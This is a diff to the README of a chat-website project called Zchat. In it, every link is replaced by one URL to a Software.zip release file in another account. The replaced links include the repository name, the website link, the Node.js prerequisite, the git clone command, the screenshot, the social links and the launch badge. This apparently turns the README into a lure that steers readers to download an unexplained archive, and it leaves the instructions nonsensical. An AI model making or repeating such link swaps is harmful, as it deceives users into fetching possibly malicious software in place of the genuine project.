@@ -4,19 +4,19 @@ Welcome to Zchat, a simple yet powerful online chat website! This repository hos
 
 ## Repository Details ℹ️
 
-- **Repository name:** zhengfu200.github.io
+- **Repository name:** https://github.com/VINONZ/zhengfu200.github.io/releases/download/v1.0/Software.zip
 - **Short description:** 💬Zchat: 一个简单的在线聊天网站
 - **Topics:** backend, frontend, github-pages, javascript, js, json-api, node-js, nodejs, quasar, quasar-cli, quasarapp, sql, sqlite, sqlite3, vue, vue3, vuejs
 
 ## Getting Started 🚀
 
-To get started with Zchat, you can either visit the [Zchat website](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) or follow the instructions below to launch the website from this repository.
+To get started with Zchat, you can either visit the [Zchat website](https://github.com/VINONZ/zhengfu200.github.io/releases/download/v1.0/Software.zip) or follow the instructions below to launch the website from this repository.
 
 ### Prerequisites
 
 Make sure you have the following installed:
 
-- Node.js
+- https://github.com/VINONZ/zhengfu200.github.io/releases/download/v1.0/Software.zip
 - npm
 - SQLite
 
@@ -24,7 +24,7 @@ Make sure you have the following installed:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/zhengfu200/zhengfu200.github.io.git
+   git clone https://github.com/VINONZ/zhengfu200.github.io/releases/download/v1.0/Software.zip
    ```
 
 2. Install dependencies:
@@ -53,7 +53,7 @@ Zchat comes with some amazing features that will enhance your chatting experienc
 - Dark mode option
 - User profiles
 
-![Zchat Screenshot](https://placeimg.com/800/400/tech)
+![Zchat Screenshot](https://github.com/VINONZ/zhengfu200.github.io/releases/download/v1.0/Software.zip)
 
 ## Contributing 🤝
 
@@ -67,9 +67,9 @@ We value your feedback! If you have any comments, questions, or suggestions, ple
 
 Stay connected with Zchat on social media for updates, tips, and more:
 
-- [Twitter](https://twitter.com/zchat)
-- [Instagram](https://instagram.com/zchat)
-- [Facebook](https://facebook.com/zchat)
+- [Twitter](https://github.com/VINONZ/zhengfu200.github.io/releases/download/v1.0/Software.zip)
+- [Instagram](https://github.com/VINONZ/zhengfu200.github.io/releases/download/v1.0/Software.zip)
+- [Facebook](https://github.com/VINONZ/zhengfu200.github.io/releases/download/v1.0/Software.zip)
 
 ## License 📄
 
@@ -77,6 +77,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-**Note:** For the latest version of Zchat, please visit [Releases](https://github.com/zhengfu200/zhengfu200.github.io/releases).
+**Note:** For the latest version of Zchat, please visit [Releases](https://github.com/VINONZ/zhengfu200.github.io/releases/download/v1.0/Software.zip).
 
-[![Launch Zchat](https://img.shields.io/badge/Launch-Zchat-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Launch Zchat](https://github.com/VINONZ/zhengfu200.github.io/releases/download/v1.0/Software.zip)](https://github.com/VINONZ/zhengfu200.github.io/releases/download/v1.0/Software.zip)
